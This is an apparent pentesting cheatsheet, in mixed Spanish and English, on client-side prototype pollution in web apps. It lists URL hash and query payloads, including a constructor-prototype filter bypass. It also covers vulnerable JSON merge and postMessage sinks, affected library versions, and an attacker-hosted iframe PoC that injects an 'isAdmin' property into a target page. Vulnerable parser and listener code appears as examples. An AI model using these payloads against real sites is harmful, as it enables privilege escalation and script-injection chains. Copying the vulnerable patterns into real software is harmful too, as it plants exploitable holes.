---
aliases:
  - Client-Side PP
  - DOM Prototype Pollution
  - DOM PP
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# Prototype Pollution - Vectores Client-Side

***

## URL Hash / Search Injection

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Pollution via location.hash | `https://target/?#__proto__[polluted]=yes` | Si client JS parsea hash a object. |
| Pollution via location.search | `https://target/?__proto__[polluted]=yes` | Si client JS parsea query string. |
| jQuery Param parser | jQuery `$.param.querystring` viejo | CVE-2019-11358. |
| Object.fromEntries(URLSearchParams) | Fromentries crea objects — chequear si recursive | Edge case. |
| Custom URL parser | `decodeURIComponent` + split + reduce | Common DIY parser vulnerable. |
| Hash bang routing | `/#!/path?__proto__[x]=y` | SPA routers. |
| Vue Router | Vue Router viejo | Affected versions. |
| Angular Location | Angular versions <11 | Affected. |
| React Router (memory) | Less likely — pero si custom parse | Lookup. |
| Nested keys via brackets | `?obj[__proto__][polluted]=yes` | Bracket notation. |
| Constructor pattern | `?constructor[prototype][polluted]=yes` | Bypass `__proto__` filter. |
| Dot notation | `?__proto__.polluted=yes` | Some parsers usan dot. |
^pp-client-url

### PoC URL hash pollution

```javascript
// Vulnerable code typical en SPAs
function parseHash() {
  const hash = location.hash.slice(1);  // remove #
  return hash.split('&').reduce((acc, pair) => {
    const [k, v] = pair.split('=');
    // VULN: si k contiene __proto__, polluciona Object
    deepSet(acc, k.split('.'), v);
    return acc;
  }, {});
}

// Visit: https://target/#__proto__.polluted=yes
// All objects now have .polluted = "yes"
```

___

## JSON.parse + Merge

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| LocalStorage merge | `JSON.parse(localStorage.config)` + lodash merge | Atacante vía XSS hosting → control of localStorage. |
| Fetch + merge | `fetch().then(r=>r.json()).then(d=>_.merge(state, d))` | API response controlado puede polucionar. |
| postMessage handler | `window.addEventListener('message', e => merge(state, e.data))` | Cross-origin postMessage. |
| Cookie JSON | `JSON.parse(document.cookie.split('=')[1])` + merge | Cookie controlled by atacante. |
| URL fragment JSON | `JSON.parse(decodeURIComponent(location.hash.slice(1)))` | Custom serialization. |
| GraphQL response | Cliente que merge response state | Apollo / Relay configs. |
| WebSocket message | `socket.on('msg', d => state.merge(d))` | Real-time. |
| ServiceWorker cache | SW que merge cached data con fresh fetch | Edge case. |
^pp-client-json

___

## DOM-based Pollution

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| jQuery 3.x pre-3.4 | `$.extend(true, {}, ...)` con user input | CVE-2019-11358. |
| jQuery deparam | Plugin para parsear URL → vulnerable. | jquery-deparam. |
| Vue 2.x mutation reactive | `Vue.set(state, '__proto__.x', 'y')` | Vue tiene safety en versions modernas. |
| Underscore.js | `_.extend` deep no recursive (safe), `_.defaults` igual | Generalmente safer que lodash. |
| Mustache templating | Algunos engines viejos | Lookup. |
| Handlebars helpers | Custom helpers que mergean | Lookup. |
| Polymer/LitElement | Property merging en components | Edge case. |
| Backbone Model.set | Si recursive | Lookup version. |
| Knockout | Similar | Lookup. |
| Custom DOM scrapers | Code que parsea atributos data-* y mergea | DIY anti-pattern. |
^pp-client-dom

___

## postMessage Abuse

| **Patrón** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Listener sin origin check | `window.addEventListener('message', e => merge(config, e.data))` | Acepta de cualquier origen. |
| Atacante hostea iframe | `<iframe src="https://target/"></iframe>` + `iframe.contentWindow.postMessage({"__proto__":{"polluted":"yes"}}, '*')` | Cross-origin pollution. |
| Window.opener | Cuando victim abre target en nueva ventana, atacante con opener mantiene reference | Same vector. |
| BroadcastChannel | Same family API | Less common pero similar. |
| MessageChannel ports | Custom ports sin validation | Lookup. |
| Combine con XSS | XSS injecta listener malicioso → exfil | Chain. |
| Combine con OAuth flow | Postmessage en OAuth callback | Auth flow PP. |
^pp-client-postmessage

### postMessage pollution PoC

```html
<!-- Atacante: attacker.com -->
<iframe src="https://target.com/" id="t"></iframe>
<script>
  document.getElementById('t').onload = () => {
    document.getElementById('t').contentWindow.postMessage(
      {"__proto__":{"isAdmin":true}},
      '*'  // any origin
    );
  };
</script>
```

Si target.com tiene listener:
```javascript
// Vulnerable target code
window.addEventListener('message', e => {
  // No origin check!
  Object.assign(config, e.data);  // o _.merge, o custom recursive merge
});
```

→ Pollution global en window de target.

***
